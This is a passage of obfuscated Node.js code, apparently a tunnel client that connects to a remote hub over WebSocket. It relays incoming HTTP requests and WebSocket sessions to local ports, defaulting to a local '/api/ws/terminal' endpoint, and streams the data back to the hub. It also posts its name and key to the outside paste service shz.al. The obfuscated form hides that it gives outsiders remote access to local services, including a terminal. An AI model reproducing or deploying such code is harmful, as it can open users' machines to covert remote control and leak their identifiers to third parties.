                this[m9(0x933)][m9(0x76b)](0x3e8, a[m9(0x2ec)]);
            } catch (b) {
            }
            this[m9(0x933)] = null;
        }
    }
    [a0d9(0xd8e)](a) {
        const ma = a0d9, b = {
                'CjMsh': function (d, f) {
                    return d === f;
                }
            }, c = this['_hubWs'];
        if (c && b[ma(0x289)](c[ma(0x1018)], a0cP[ma(0x66a)]))
            try {
                c['send'](JSON[ma(0x41c)](a));
            } catch (d) {
            }
    }
    async [a0d9(0x2b5)]() {
        const mb = a0d9, a = {
                'zgrOU': function (b, c) {
                    return b instanceof c;
                }
            };
        while (!this[mb(0xf6f)]) {
            try {
                await this[mb(0x212)]();
            } catch (c) {
                this['_recordFailure'](c), this[mb(0xe4c)] = a[mb(0xe67)](c, a0aD) ? c : null;
            }
            if (this[mb(0xf6f)])
                break;
            const b = this[mb(0xc22)]();
            this[mb(0x4c7)]['warning'](mb(0x468)[mb(0x83f)](this[mb(0xef5)], mb(0xf50))[mb(0x83f)](Math[mb(0xde8)](b), 's\x20后第\x20')[mb(0x83f)](this['consecutiveFailures'], mb(0xb31))), await this[mb(0x53a)](b * 0x3e8);
        }
    }
    [a0d9(0x53a)](a) {
        const b = {
            'Dkqxk': function (c, d) {
                return c >= d;
            },
            'sFqqd': function (c, d) {
                return c - d;
            },
            'JKWhv': function (c) {
                return c();
            },
            'lAHat': function (c, d, f) {
                return c(d, f);
            }
        };
        return new Promise(c => {
            const me = a0b, d = {
                    'cPdDN': function (h, i) {
                        return b['Dkqxk'](h, i);
                    },
                    'JVgCC': function (h, i) {
                        const mc = a0b;
                        return b[mc(0x915)](h, i);
                    },
                    'RmhpD': function (h, i) {
                        return h(i);
                    },
                    'mWSJf': function (h) {
                        const md = a0b;
                        return b[md(0xebd)](h);
                    }
                }, f = Date[me(0x8da)](), g = b[me(0x355)](setInterval, () => {
                    const mf = me;
                    (this['_stopFlag'] || d[mf(0xb7d)](d[mf(0x3a4)](Date[mf(0x8da)](), f), a)) && (d[mf(0x5f1)](clearInterval, g), d[mf(0x8ec)](c));
                }, 0xfa);
        });
    }
    async [a0d9(0x212)]() {
        const mg = a0d9, a = {
                'XVRCY': function (d, f) {
                    return d(f);
                },
                'lQBgJ': mg(0xbc9),
                'FVvGV': mg(0x694),
                'sHpgF': mg(0x365),
                'YJezx': 'pong',
                'iQhfI': mg(0xdae),
                'YodYr': mg(0x7b6),
                'VIRyQ': function (d) {
                    return d();
                },
                'ezMtU': function (d, f) {
                    return d(f);
                },
                'qjooG': mg(0x2b1),
                'wdCAf': function (d, f) {
                    return d(f);
                },
                'fYbiF': function (d, f) {
                    return d(f);
                },
                'hNGVQ': mg(0x7c9),
                'rUxIz': mg(0x769),
                'OrpsZ': 'close',
                'duxQS': 'error',
                'iTjyT': function (d, f) {
                    return d(f);
                },
                'OpQkA': function (d, f, g) {
                    return d(f, g);
                }
            }, b = a[mg(0xa57)](a0ax, this[mg(0x3de)]);
        if (b)
            throw new Error(b);
        const c = a['fYbiF'](a0av, this[mg(0x3de)]) ? await a['OpQkA'](a0aA, this[mg(0x3de)], this[mg(0x27e)]) : this[mg(0x3de)];
        return this[mg(0x139)] = c, this[mg(0xb22)] = ''[mg(0x83f)](this[mg(0xb80)] || c, '/')['concat'](this[mg(0xebe)]), new Promise((d, f) => {
            const mi = mg, g = {
                    'yeIqR': function (q) {
                        return a['VIRyQ'](q);
                    },
                    'Rxihm': function (q, r) {
                        return a['ezMtU'](q, r);
                    },
                    'KjJug': function (q, r) {
                        return q(r);
                    },
                    'GbzwM': a['qjooG'],
                    'AQFPI': function (q, r) {
                        const mh = a0b;
                        return a[mh(0x24c)](q, r);
                    }
                }, h = a[mi(0x24c)](a0aa, c);
            let i;
            try {
                i = this['_wsFactory'] ? this[mi(0xb9a)](h) : new a0cP(h);
            } catch (q) {
                return a['fYbiF'](f, q);
            }
            this[mi(0x933)] = i;
            const j = new Map();
            let k = ![], l = ![], m = null;
            const n = () => {
                    const mj = mi;
                    m && (a['XVRCY'](clearInterval, m), m = null);
                    for (const r of j['values']())
                        r[mj(0xe73)]();
                    j[mj(0x3bb)]();
                }, o = () => {
                    const mk = mi;
                    !k && (k = !![], n(), g[mk(0xb64)](d));
                }, p = r => {
                    const ml = mi;
                    !k && (k = !![], g[ml(0xb64)](n), g[ml(0xd37)](f, r));
                };
            i['on'](a[mi(0xa22)], () => {
                const mm = mi, r = {
                        't': mm(0x427),
                        'v': 0x1,
                        'kname': this['kname'],
                        'version': a0aE[mm(0x4a2)],
                        'ports': [...this[mm(0xfea)]][mm(0xcd4)]((s, t) => s - t)
                    };
                r[mm(0xe00)] = this[mm(0xb80)] || c, this[mm(0xd8e)](r);
            }), i['on'](a[mi(0xf2c)], (r, s) => {
                const mn = mi, t = { 'QumZW': a[mn(0x6bc)] };
                if (s)
                    return;
                let u;
                try {
                    u = JSON[mn(0xadd)](r[mn(0x43a)](mn(0xec2)));
                } catch (v) {
                    return;
                }
                if (!l) {
                    if (u['t'] !== a[mn(0xea5)])
                        return;
                    if (!u['ok']) {
                        p(new a0aD(u[mn(0x503)] || mn(0x2de), u[mn(0x769)] || ''));
                        return;
                    }
                    l = !![], this[mn(0x13d)] = a['sHpgF'], this[mn(0x670)] = 0x0, this[mn(0xef5)] = null, this[mn(0x941)] = a0aC(), this[mn(0x4c7)][mn(0x543)](mn(0x85c)[mn(0x83f)](c, '\x20(注册名\x20')[mn(0x83f)](this['kname'], mn(0x447))[mn(0x83f)](this[mn(0xb22)], ')')), m = setInterval(() => {
                        const mo = mn;
                        if (this[mo(0xf6f)] || i[mo(0x1018)] !== a0cP[mo(0x66a)])
                            return;
                        this['_send']({ 't': t[mo(0x634)] });
                    }, this[mn(0xb5a)]);
                    return;
                }
                switch (u['t']) {
                case a[mn(0xaf8)]:
                    break;
                case mn(0xe09):
                    this[mn(0x9d3)](u)['catch'](() => {
                    });
                    break;
                case mn(0x7d2): {
                        const w = new a0cR(this, i, u['id'], u);
                        j[mn(0x42d)](u['id'], w), w[mn(0x373)]();
                        break;
                    }
                case a['iQhfI']: {
                        const x = j['get'](u['id']);
                        if (x)
                            x['fromHub'](u);
                        break;
                    }
                case a[mn(0x705)]: {
                        const y = j['get'](u['id']);
                        y && (j['delete'](u['id']), y[mn(0x2b7)](u));
                        break;
                    }
                default:
                    break;
                }
            }), i['on'](a[mi(0xef0)], () => {
                const mp = mi;
                this['_hubWs'] = null;
                if (l)
                    o();
                else
                    g['KjJug'](p, new Error(g[mp(0x57c)]));
            }), i['on'](a[mi(0xc49)], r => {
                const mq = mi;
                if (!l)
                    g[mq(0xbec)](p, r);
            });
        });
    }
    async ['_handleReq'](a) {
        const mr = a0d9, b = {
                'dweHB': mr(0x249),
                'nHats': function (k, l) {
                    return k === l;
                },
                'aIvKj': mr(0x5c6),
                'HXxPl': function (k, l, m) {
                    return k(l, m);
                },
                'Nanjs': function (k, l) {
                    return k(l);
                },
                'sutfs': mr(0xf37),
                'cNfmk': 'base64',
                'IiFBp': mr(0xdd1),
                'HSXmk': mr(0xd07),
                'Oqngd': function (k, l) {
                    return k(l);
                }
            }, c = a['id'], d = a[mr(0x56f)] || mr(0x4e4), g = String(a[mr(0x174)] || b[mr(0xb0f)])[mr(0x515)](), h = a[mr(0x4fa)] || '/', i = a[mr(0x842)] || '', j = a[mr(0x88f)] ? Buffer['from'](a['body_b64'], 'base64') : Buffer[mr(0x901)](0x0);
        this[mr(0x55d)] += 0x1;
        try {
            let k, l;
            b[mr(0x63e)](d, b[mr(0x775)]) ? (k = b['HXxPl'](parseInt, a['port'], 0xa) || 0x0, l = b[mr(0x30f)](a0aj, a0ad)) : (k = this[mr(0x5c6)], l = null);
            const {
                status: m,
                headers: n,
                body: o
            } = await b[mr(0x30f)](a0at, {
                'port': k,
                'whitelist': l,
                'method': g,
                'path': h,
                'query': i,
                'headers': a[mr(0x57f)],
                'body': j,
                'maxBody': this[mr(0x803)],
                'relayTimeout': this[mr(0x260)],
                'requestFn': this['_request'] || undefined
            });
            this[mr(0xd8e)]({
                't': b[mr(0xda5)],
                'id': c,
                'status': m,
                'headers': n,
                'body_b64': o['toString'](b[mr(0x106c)])
            });
        } catch (p) {
            const q = p && p[mr(0x223)] ? p[mr(0x223)] : p && b[mr(0x63e)](p[mr(0x503)], b['IiFBp']) ? b[mr(0x424)] : b['HSXmk'];
            this[mr(0xd10)](c, q, b[mr(0xb57)](String, p && p[mr(0x769)] || p)[mr(0x47b)](0x0, 0x12c));
        }
    }
    [a0d9(0x594)](a, b, c, d, f) {
        const ms = a0d9, g = {
                'nSlEC': function (h, i, j, k, l, m, n) {
                    return h(i, j, k, l, m, n);
                }
            };
        return g[ms(0xe02)](a0ap, a, b, c, d, f, this[ms(0x803)]);
    }
    ['_sendErr'](a, b, c) {
        const mt = a0d9;
        this[mt(0xd8e)]({
            't': mt(0x32d),
            'id': a,
            'code': b,
            'message': c
        });
    }
}
class a0cR {
    constructor(a, b, c, d) {
        const mu = a0d9, g = {
                'fHJby': '/api/ws/terminal',
                'uUOeh': function (i, j, l) {
                    return i(j, l);
                },
                'rPRpc': 'sec-websocket-'
            };
        this[mu(0xbab)] = a, this[mu(0xe97)] = b, this[mu(0x67e)] = c, this[mu(0x4fa)] = d[mu(0x4fa)] || g[mu(0x271)], this[mu(0x842)] = d[mu(0x842)] || '', this[mu(0x5c6)] = g[mu(0x265)](parseInt, d[mu(0x5c6)], 0xa) || 0x0;
        const h = {};
        for (const [i, j] of Object['entries'](a0ab(d[mu(0x57f)]))) {
            if (!i[mu(0x544)]()[mu(0x1ba)](g[mu(0x2a7)]))
                h[i] = j;
        }
        this['headers'] = h, this[mu(0xa5a)] = null, this[mu(0x394)] = ![], this[mu(0x198)] = [];
    }
    [a0d9(0x373)]() {
        const mv = a0d9, a = {
                'lzeKJ': 'ws_ack',
                'ijaSm': mv(0xdae),
                'UBoWo': mv(0x990),
                'gIZIU': mv(0x66e),
                'hHpIz': mv(0x7b6),
                'Thrxe': function (g, h) {
                    return g || h;
                },
                'Amkhn': mv(0x59e),
                'HDRBu': function (g, h) {
                    return g(h);
                },
                'IJzTV': function (g, h) {
                    return g + h;
                },
                'SpQDB': 'open',
                'VXGDU': mv(0x769),
                'Opkth': mv(0xfcc),
                'EXUaN': mv(0x76b)
            };
        if (this[mv(0x5c6)] && !a[mv(0xef1)](a0aj, a0ad)[mv(0x152)](this[mv(0x5c6)])) {
            this[mv(0x394)] = !![], this[mv(0xbab)][mv(0xd8e)]({
                't': a[mv(0xbdf)],
                'id': this[mv(0x67e)],
                'ok': ![],
                'message': mv(0xd7d)[mv(0x83f)](this[mv(0x5c6)], mv(0x4b7))
            });
            return;
        }
        const b = this[mv(0x5c6)] || this[mv(0xbab)][mv(0x5c6)], c = mv(0xb9f)[mv(0x83f)](b)[mv(0x83f)](this[mv(0x4fa)])[mv(0x83f)](this[mv(0x842)] ? a['IJzTV']('?', this['query']) : '');
        let d;
        try {
            d = this[mv(0xbab)][mv(0xb9a)] ? this[mv(0xbab)][mv(0xb9a)](c) : new a0cP(c, { 'headers': this[mv(0x57f)] });
        } catch (g) {
            this[mv(0x394)] = !![], this[mv(0xbab)]['_send']({
                't': a[mv(0xbdf)],
                'id': this[mv(0x67e)],
                'ok': ![],
                'message': a[mv(0xef1)](String, g[mv(0x769)] || g)[mv(0x47b)](0x0, 0xc8)
            });
            return;
        }
        this['localWs'] = d;
        let f = ![];
        d['on'](a[mv(0x3cb)], () => {
            const mw = mv;
            f = !![], this['mgr'][mw(0xd8e)]({
                't': a[mw(0xbdf)],
                'id': this['sid'],
                'ok': !![]
            }), this[mw(0x8f8)]();
        }), d['on'](a[mv(0xa2b)], (h, i) => {
            const mx = mv;
            this['mgr'][mx(0xd8e)]({
                't': a[mx(0x50c)],
                'id': this[mx(0x67e)],
                'bt': i ? a[mx(0xad1)] : mx(0x9d6),
                'data_b64': Buffer[mx(0xca5)](h)[mx(0x43a)](a['gIZIU'])
            });
        }), d['on'](a[mv(0x302)], h => {
            const my = mv;
            !f && !this[my(0x394)] && (this[my(0x394)] = !![], this[my(0xbab)][my(0xd8e)]({
                't': a['lzeKJ'],
                'id': this[my(0x67e)],
                'ok': ![],
                'message': String(h['message'] || h)[my(0x47b)](0x0, 0xc8)
            }));
        }), d['on'](a[mv(0xe51)], (h, i) => {
            const mz = mv;
            if (this['stopped'])
                return;
            this['stopped'] = !![], this['mgr']['_send']({
                't': a['hHpIz'],
                'id': this[mz(0x67e)],
                'ws_code': a['Thrxe'](h, 0x3e8),
                'reason': i ? i[mz(0x43a)]() : a[mz(0x1014)]
            });
        });
    }
    [a0d9(0xe48)](a) {
        const mA = a0d9;
        if (this[mA(0x394)])
            return;
        if (!this['localWs'] || this[mA(0xa5a)][mA(0x1018)] !== a0cP[mA(0x66a)]) {
            this[mA(0xa5a)] && this[mA(0xa5a)][mA(0x1018)] === a0cP[mA(0x837)] && this[mA(0x198)][mA(0xb66)](a);
            return;
        }
        this[mA(0x8f8)](), this['_sendToLocal'](a);
    }
    [a0d9(0x8f8)]() {
        const mB = a0d9, a = {
                'FICXW': function (b, c) {
                    return b === c;
                }
            };
        while (this['_pendingFromHub'][mB(0xc54)] && this[mB(0xa5a)] && a[mB(0xe2b)](this['localWs'][mB(0x1018)], a0cP['OPEN'])) {
            this[mB(0x2d6)](this['_pendingFromHub'][mB(0x719)]());
        }
    }
    [a0d9(0x2d6)](a) {
        const mC = a0d9, b = {
                'Jushs': 'base64',
                'qCWwM': function (d, g) {
                    return d === g;
                },
                'jglty': mC(0x990),
                'zxOzN': mC(0xec2)
            }, c = Buffer['from'](a[mC(0x9f7)] || '', b[mC(0xd39)]);
        if (b[mC(0x1a9)](a['bt'], b[mC(0x236)]))
            this[mC(0xa5a)][mC(0x871)](c, { 'binary': !![] });
        else
            this['localWs'][mC(0x871)](c[mC(0x43a)](b['zxOzN']), { 'binary': ![] });
    }
    ['closeFromHub'](a) {
        const mD = a0d9, b = {
                'JdkJK': function (c, d) {
                    return c === d;
                }
            };
        this['stopped'] = !![];
        if (this[mD(0xa5a)] && b[mD(0xfbc)](this['localWs']['readyState'], a0cP[mD(0x66a)]))
            try {
                this[mD(0xa5a)][mD(0x76b)](0x3e8, Buffer[mD(0xca5)](String(a['reason'] || '')));
            } catch (c) {
            }
    }
    [a0d9(0xe73)]() {
        const mE = a0d9, a = {
                'drbyH': function (b, c) {
                    return b !== c;
                }
            };
        this['stopped'] = !![];
        if (this[mE(0xa5a)] && a[mE(0xa0c)](this[mE(0xa5a)]['readyState'], a0cP[mE(0xf0d)]))
            try {
                this[mE(0xa5a)]['close'](0x3e9);
            } catch (b) {
            }
    }
}
class a0cS {
    constructor(a) {
        const mF = a0d9;
        this['items'] = new Map(), this['log'] = a || a0R, this[mF(0x92d)] = null;
    }
    async [a0d9(0x427)](a, b, c, d = a0d9(0x6e9), f = 0x3a98) {
        const mG = a0d9, g = {
                'TrgAE': function (o, p) {
                    return o || p;
                },
                'rMfDQ': 'invalid_name',
                'MFcet': 'failed',
                'wsElh': 'unreachable',
                'Jhbda': function (o, p) {
                    return o(p);
                }
            }, h = a0a7(b), i = a0aw(a);
        if (h)
            return {
                'snapshot': {
                    'kname': g[mG(0xb43)](b, '')['trim']()[mG(0x544)](),
                    'hub': i,
                    'source': d,
                    'tunnel_status': mG(0x95f),
                    'ports': [...c || []][mG(0xcd4)]((o, p) => o - p)
                },
                'code': g[mG(0x584)],
                'message': h
            };
        const j = b[mG(0x5b0)]()[mG(0x544)]();
        if (this[mG(0x75b)]['has'](j))
            return {
                'snapshot': this[mG(0x75b)][mG(0xb12)](j)[mG(0x86c)](),
                'code': 'name_taken',
                'message': 'KNAME\x20已在本\x20agent\x20注册表中\x20(kname\x20唯一)'
            };
        const k = this[mG(0x92d)] ? this[mG(0x92d)](i, b, a0aE[mG(0x563)], c, this['log'], d) : new a0cQ(i, b, a0aE[mG(0x563)], c, this[mG(0x4c7)], d);
        k[mG(0x373)]();
        const {
            ok: l,
            err: m
        } = await k[mG(0xa51)](f);
        if (l)
            return this['items']['set'](j, k), {
                'snapshot': k['snapshot'](),
                'code': null,
                'message': null
            };
        if (m instanceof a0aD) {
            k['stop']();
            const o = k[mG(0x86c)]();
            return o[mG(0xc5b)] = g['MFcet'], {
                'snapshot': o,
                'code': m[mG(0x503)],
                'message': m['message']
            };
        }
        const n = k['snapshot']();
        return n[mG(0xc5b)] = mG(0x892), this['items'][mG(0x42d)](j, k), {
            'snapshot': n,
            'code': g[mG(0xf18)],
            'message': g[mG(0x521)](String, m && m[mG(0x769)] || mG(0x8d5))
        };
    }
    [a0d9(0x5c9)](a) {
        const mH = a0d9, b = {
                'puUlp': function (g, h) {
                    return g || h;
                }
            }, c = b[mH(0x1f9)](a, '')['trim']()[mH(0x544)](), d = this[mH(0x75b)][mH(0xb12)](c);
        if (!d)
            return null;
        const f = d[mH(0x86c)]();
        return this['items'][mH(0x350)](c), d[mH(0xe73)](), f;
    }
    [a0d9(0xb12)](a) {
        const mI = a0d9;
        return this[mI(0x75b)]['get']((a || '')['trim']()[mI(0x544)]()) || null;
    }
    ['list']() {
        const mJ = a0d9;
        return [...this[mJ(0x75b)][mJ(0x570)]()][mJ(0xf2e)](a => a['snapshot']());
    }
    ['stopAll']() {
        const mK = a0d9;
        for (const a of this[mK(0x75b)]['values']())
            a[mK(0xe73)]();
        this[mK(0x75b)][mK(0x3bb)]();
    }
}
class a0cT {
    static ['_baseinfoHooked'] = ![];
    static [a0d9(0xab3)] = null;
    static [a0d9(0xae2)] = /^[A-Za-z0-9+_\-*$=@,;[/\]]+$/;
    static [a0d9(0xd50)] = ![];
    static ['knameValid']() {
        const mL = a0d9, a = {
                'mQxVj': function (g, h) {
                    return g < h;
                },
                'ryIuK': 'KNAME\x20含非法字符\x20(限字母数字及\x20+_-[]*$=@,;/)',
                'pKsth': mL(0xc03),
                'kRRcJ': mL(0x70d),
                'RRPkB': function (g, h) {
                    return g === h;
                },
                'HYcxA': function (g, h) {
                    return g || h;
                },
                'xEaXu': '(未设置)',
                'AFmOh': mL(0xfc9),
                'LfwCP': '[KMODE]\x20💡\x20修正:\x20设置\x20≥8\x20字符的\x20KNAME\x20且\x20(可选)\x20KNAME_KEY\x20≥8\x20字符,\x20例如:\x20KNAME=myname\x20KNAME_KEY=mysecret-pass'
            }, b = a0aE['KNAME'] || '', c = a0aE[mL(0xc03)] || a0aE[mL(0x70d)] || '', d = [];
        if (a[mL(0xf42)](b[mL(0xc54)], 0x3))
            d['push'](mL(0x4a8)[mL(0x83f)](b[mL(0xc54)], mL(0x32a)));
        if (!this[mL(0xae2)]['test'](b))
            d[mL(0xb66)](a[mL(0xcde)]);
        if (a[mL(0xf42)](c[mL(0xc54)], 0x8))
            d[mL(0xb66)](mL(0x3cf)[mL(0x83f)](c[mL(0xc54)], '<8,\x20实际使用\x20')[mL(0x83f)](a0aE[mL(0xc03)] ? a[mL(0xcbd)] : a[mL(0x379)], ')'));
        const f = a[mL(0x4ad)](d[mL(0xc54)], 0x0);
        return !f && !this['_SHZAL_KEY_HINT_SHOWN'] && (this[mL(0xd50)] = !![], a0R[mL(0x543)](mL(0x858)[mL(0x83f)](d['join'](';\x20'), '\x20') + mL(0x4f4)['concat'](a[mL(0xd52)](b, a[mL(0xe8c)]), mL(0x21e))[mL(0x83f)](a0aE[mL(0xc03)] ? mL(0x91a)['concat'](a0aE[mL(0xc03)][mL(0xc54)], ')') : a[mL(0x552)], ')')), a0R[mL(0x543)](a['LfwCP'])), f;
    }
    static [a0d9(0x930)]() {
        const mM = a0d9, a = {
                'VHvEc': function (b, c) {
                    return b === c;
                },
                'bJoYS': function (b, c) {
                    return b(c);
                },
                'dMfZo': mM(0xf0e)
            };
        return a0aE[mM(0x6c0)] || a[mM(0xf52)](a[mM(0xab5)](String, process.env.SHZAL_DEBUG || '')[mM(0x544)](), a[mM(0xaeb)]);
    }
    static ['reportShzal'](a, b = null, c = null) {
        const mN = a0d9, d = {
                'ayLAc': function (i, j) {
                    return i + j;
                },
                'RdZkS': mN(0x276),
                'nPzaN': mN(0x707),
                'yBiqS': mN(0xfcc),
                'xJVdU': mN(0x873),
                'ZVYhz': function (i, j) {
                    return i(j);
                },
                'WWJZG': function (i, j) {
                    return i + j;
                },
                'gRFMS': 'POST\x20https://shz.al/\x20状态:\x20',
                'PBqMb': function (i, j) {
                    return i + j;
                },
                'gulvp': function (i, j) {
                    return i + j;
                },
                'qCYAl': mN(0x8c2),
                'tTgqW': function (i, j, k, l, m) {
                    return i(j, k, l, m);
                },
                'slTgk': function (i, j) {
                    return i(j);
                },
                'RDAvz': mN(0xdfb),
                'fhSum': function (i, j) {
                    return i + j;
                },
                'Wbdhm': function (i, j) {
                    return i + j;
                },
                'zguPL': mN(0x246),
                'aBeYE': function (i, j) {
                    return i(j);
                },
                'VwKDE': function (i, j) {
                    return i(j);
                },
                'LMUZO': function (i, j) {
                    return i + j;
                },
                'DwKlD': function (i, j) {
                    return i !== j;
                },
                'uDXzt': function (i, j) {
                    return i + j;
                },
                'EEymr': function (i, j) {
                    return i(j);
                },
                'GFUGA': function (i, j) {
                    return i + j;
                },
                'DcCJG': function (i, j) {
                    return i + j;
                },
                'WPoIx': mN(0x66b),
                'ukFux': function (i, j) {
                    return i > j;
                },
                'LrLsn': mN(0x317),
                'FhNbi': mN(0xe14),
                'cjGBZ': function (i, j) {
                    return i(j);
                },
                'ietUx': '上报异常:\x20',
                'oUcyu': function (i, j) {
                    return i === j;
                }
            }, f = this[mN(0x930)](), g = i => {
                const mO = mN;
                if (f)
                    a0R[mO(0xac2)](d[mO(0x809)](d[mO(0x336)], i));
            }, h = d[mN(0xa2a)](b, null);
        return new Promise(i => {
            const mQ = mN, j = {
                    'YFoIR': function (q, r) {
                        return d['VwKDE'](q, r);
                    },
                    'pApkg': function (q, r) {
                        const mP = a0b;
                        return d[mP(0x4c2)](q, r);
                    },
                    'bKDrN': function (q, r) {
                        return q + r;
                    }
                }, k = b !== null ? b : a0aE['KNAME'], l = d[mQ(0xcf4)](c, null) ? c : a0aE[mQ(0xc03)] || a0aE['KNAME'], m = d['uDXzt'](mQ(0x37a), a0k['randomBytes'](0xc)[mQ(0x43a)](mQ(0x1a2))), n = [
                    [
                        'c',
                        a
                    ],
                    [
                        'n',
                        k
                    ],
                    [
                        's',
                        l
                    ],
                    [
                        'e',
                        '7d'
                    ]
                ], o = q => {
                    const mR = mQ, r = q[mR(0xf2e)](([s, t]) => Buffer['from']('--'[mR(0x83f)](m, mR(0x710))[mR(0x83f)](s, mR(0x632))['concat'](t, '\x0d\x0a')));
                    return r[mR(0xb66)](Buffer[mR(0xca5)]('--'[mR(0x83f)](m, mR(0xfc3)))), Buffer[mR(0x83f)](r);
                }, p = (q, r, s, t) => {
                    const mS = mQ, v = { 'GzAxz': mS(0xdc9) }, w = new URL(q), x = a0h[mS(0xfc5)]({
                            'hostname': w[mS(0x8d1)],
                            'port': w['port'] || 0x1bb,
                            'path': w[mS(0x250)] + w[mS(0x65a)],
                            'method': s,
                            'headers': {
                                'Content-Type': mS(0x170)[mS(0x83f)](m),
                                'Content-Length': r ? r[mS(0xc54)] : 0x0,
                                'User-Agent': d[mS(0x79e)]
                            }
                        }, y => {
                            const mT = mS;
                            y[mT(0xf28)](), y['on'](v[mT(0x68e)], () => t(y['statusCode']));
                        });
                    x['on'](d[mS(0xe99)], y => {
                        const mU = mS;
                        j['YFoIR'](g, j[mU(0x21b)](j[mU(0xecb)](j[mU(0xecb)](j['pApkg'](s, '\x20'), q), '\x20请求异常:\x20'), y[mU(0x769)])), t(0x0);
                    }), x['setTimeout'](0x7530, () => x[mS(0x28a)](new Error(mS(0xf5e))));
                    if (r)
                        x[mS(0xc5e)](r);
                    x[mS(0xdc9)]();
                };
            d[mQ(0x51c)](g, d[mQ(0xfd3)](d['DcCJG'](d[mQ(0xfe4)], k) + '\x20(key\x20已设置:\x20', d[mQ(0x5fb)](l[mQ(0xc54)], 0x0)) + ')');
            try {
                d[mQ(0x16a)](p, d[mQ(0xb49)], o(n), d['FhNbi'], q => {
                    const mV = mQ, r = {
                            'ipugT': function (s, t) {
                                return s(t);
                            },
                            'CSRFB': function (s, t) {
                                return d['ayLAc'](s, t);
                            },
                            'KuAly': d[mV(0x47d)]
                        };
                    d[mV(0xa23)](g, d[mV(0x69e)](d[mV(0x82a)], q));
                    if (q === 0x199) {
                        d[mV(0xa23)](g, d['PBqMb'](d[mV(0x1015)](d[mV(0x444)], k), ':*'));
                        const s = n['filter'](([t]) => t !== 'n');
                        d['tTgqW'](p, mV(0xf6c)['concat'](k, ':')['concat'](l), d[mV(0x43c)](o, s), mV(0x94f), t => {
                            const mW = mV;
                            r[mW(0xe37)](g, r['CSRFB'](mW(0xb46), t) + (t === 0xc8 ? mW(0x13f) : r[mW(0x65c)])), i(t === 0xc8);
                        });
                    } else
                        q === 0xc8 ? (d['slTgk'](g, d['RDAvz']), d[mV(0xa23)](i, !![])) : (g(d[mV(0x41f)](d[mV(0x629)](d['zguPL'], q), ')')), d[mV(0x86a)](i, ![]));
                });
            } catch (q) {
                d[mQ(0xca2)](g, d[mQ(0x1015)](d[mQ(0xf79)], q[mQ(0x769)])), i(![]);
            }
        })[mN(0xdcb)](i => {
            const mX = mN;
            if (i && h)
                this[mX(0xab3)] = a;
            return i;
        })[mN(0x92f)](() => ![]);
    }
    static async [a0d9(0x518)](a, b = null, c = null) {
        const mY = a0d9, d = {
                'cNzKr': function (f, g) {
                    return f <= g;
                },
                'OjteM': function (f, g) {
                    return f < g;
                }
            };
        for (let f = 0x1; d[mY(0xc62)](f, 0x3); f++) {
            if (await this[mY(0x81c)](a, b, c))
                return;
            d['OjteM'](f, 0x3) && await new Promise(g => setTimeout(g, 0x3e8 * 0x2 ** f));
        }
    }
    static ['deleteShzal'](a, b) {
        const mZ = a0d9, c = {
                'QODJA': function (g, h) {
                    return g + h;
                },
                'QdVqh': mZ(0x276),
                'Mmccl': mZ(0xdc9),
                'bAyIJ': function (g, h) {
                    return g(h);
                },
                'gWTHz': function (g, h) {
                    return g + h;
                },
                'bXqRR': 'DELETE',
                'plARi': mZ(0x707),
                'YJtWp': mZ(0xfcc)
            }, d = this[mZ(0x930)](), f = g => {
                const n0 = mZ;
                if (d)
                    a0R[n0(0xac2)](c[n0(0xd78)](c[n0(0x895)], g));
            };
        return new Promise(g => {
            const n1 = mZ, h = {
                    'BODSQ': c[n1(0x1cd)],
                    'Iegxe': function (k, l) {
                        return c['QODJA'](k, l);
                    },
                    'VVUQS': n1(0xa65),
                    'kIblA': function (k, l) {
                        const n2 = n1;
                        return c[n2(0x1e5)](k, l);
                    }
                }, i = new URL('https://shz.al/~'[n1(0x83f)](a, ':')['concat'](b)), j = a0h[n1(0xfc5)]({
                    'hostname': i[n1(0x8d1)],
                    'port': i[n1(0x5c6)] || 0x1bb,
                    'path': c[n1(0xebf)](i[n1(0x250)], i[n1(0x65a)]),
                    'method': c['bXqRR'],
                    'headers': { 'User-Agent': c[n1(0xd33)] }
                }, k => {
                    const n3 = n1;
                    k[n3(0xf28)](), k['on'](h[n3(0x3b8)], () => g(k[n3(0xafa)] === 0xc8));
                });
            j['on'](c[n1(0x98c)], k => {
                const n4 = n1;
                f(h[n4(0x557)](h['VVUQS'], k[n4(0x769)])), h['kIblA'](g, ![]);
            }), j[n1(0x9f2)](0x7530, () => j[n1(0x28a)](new Error('shz.al\x20request\x20timeout'))), j[n1(0xdc9)]();
        });
    }
    static ['homeDir']() {
        const n5 = a0d9, a = [
                process.env.USERPROFILE,
                process.env.HOME
            ];
        for (const b of a) {
            if (b && a0l['existsSync'](b) && a0l[n5(0x91f)](b)[n5(0x6f4)]())
                return b;
        }
        try {
            return a0p[n5(0xfc4)]();
        } catch (c) {
            return process[n5(0x1075)]();
        }
    }
    static [a0d9(0x640)]() {
        const n6 = a0d9, a = {
                'DIoEA': n6(0x28b),
                'ylxQJ': '$HOME'
            };
        let b = (a0aE[n6(0x868)] || '')[n6(0x5b0)]();
        if (!b)
            return a0o[n6(0xd9d)](this[n6(0x55b)](), a[n6(0xe96)]);
        if (b[n6(0x1ba)](a[n6(0xc97)]))
            b = b['length'] > 0x5 ? a0o[n6(0xd9d)](this[n6(0x55b)](), b[n6(0x47b)](0x5)[n6(0x8d4)](/^[/\\]+/, '')) : this[n6(0x55b)]();
        else
            b[n6(0x1ba)]('~') && (b = a0o[n6(0x5a0)](b[n6(0x8d4)](/^~(?=[/\\]|$)/, this[n6(0x55b)]())));
        return b;
    }
    static [a0d9(0x796)](a) {
        const n7 = a0d9;
        this['_domain'] = a;
        const b = this[n7(0x640)]();
        try {
            a0l['mkdirSync'](a0o[n7(0x7e4)](a0o[n7(0x5a0)](b)), { 'recursive': !![] }), a0l[n7(0x571)](b, a), a0R['info'](n7(0x3f1)[n7(0x83f)](b));
        } catch (c) {
            a0R[n7(0x585)]('[KMODE]\x20⚠️\x20域名文件写入失败\x20('[n7(0x83f)](b, n7(0xf7b))[n7(0x83f)](c['message']));
        }
    }
    static ['deleteDomainFile']() {
        const n8 = a0d9, a = this[n8(0x640)]();
        try {
            a0l['existsSync'](a) && a0l[n8(0x91f)](a)[n8(0xaf5)]() && (a0l['unlinkSync'](a), a0R['info']('[KMODE]\x20🗑️\x20域名文件已删除:\x20'[n8(0x83f)](a)));
        } catch (b) {
            a0R[n8(0x585)](n8(0xfa7)[n8(0x83f)](a, n8(0xf7b))[n8(0x83f)](b['message']));
        }
    }
    static [a0d9(0x776)]() {
        const n9 = a0d9;
        !this['_baseinfoHooked'] && (this[n9(0x851)] = !![], this[n9(0x15b)]());
    }
    static ['startStdinListener']() {
        const na = a0d9, a = {
